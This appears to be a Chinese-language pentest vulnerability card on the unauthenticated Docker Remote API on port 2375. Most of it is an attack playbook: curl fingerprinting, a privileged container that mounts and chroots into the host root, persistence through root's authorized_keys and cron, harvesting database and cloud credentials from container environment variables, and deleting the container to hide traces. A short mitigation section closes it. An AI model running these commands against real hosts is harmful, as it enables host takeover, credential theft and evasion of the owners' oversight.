---
title: Docker Remote API 未授权（直接拿宿主）
cve: 无 CVE（配置缺陷）
severity: critical
cvss: 9.8
product: Docker Engine
versions: 任意（2375 裸露）
ports: 2375, 2376
keywords: docker, api, 2375, privileged, escape
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

```bash
curl -s http://target:2375/version
curl -s http://target:2375/containers/json
```

返回 JSON 即未授权。

## 前置条件

- 2375 明文可达（常见于 CI 机、Jenkins agent、K8s 节点）。

## PoC

```bash
docker -H tcp://target:2375 ps

# 挂宿主根目录拿全盘
docker -H tcp://target:2375 run -it --rm --privileged \
  -v /:/host alpine chroot /host sh
```

## 利用步骤

1. `curl /version` 与 `/containers/json` 确认未授权；`/images/json` 看有没有现成镜像（省得拉）。
2. 用 `-v /:/host` + `chroot` 拿宿主文件系统；`-v /var/run/docker.sock:/x` 可以进一步控制。
3. 落持久化：写宿主 `/root/.ssh/authorized_keys`、`/etc/cron.d/`；或直接 `docker exec` 进业务容器改代码。
4. 挖数据：`/containers/json` 列业务容器 → `docker exec` → 环境变量里常有 DB/云凭据。
5. 清理：删掉你创建的容器（`docker rm -f`），别留 `alpine` 之类的痕迹。

## 修复与缓解

- 2375 只绑 127.0.0.1；对外只开 2376 + TLS 双向认证。
- 检测：`/var/log/docker.log` 或 auditd 里 `docker run --privileged` 的异常。

## 参考

- Docker 官方《Protect the Docker daemon socket》。
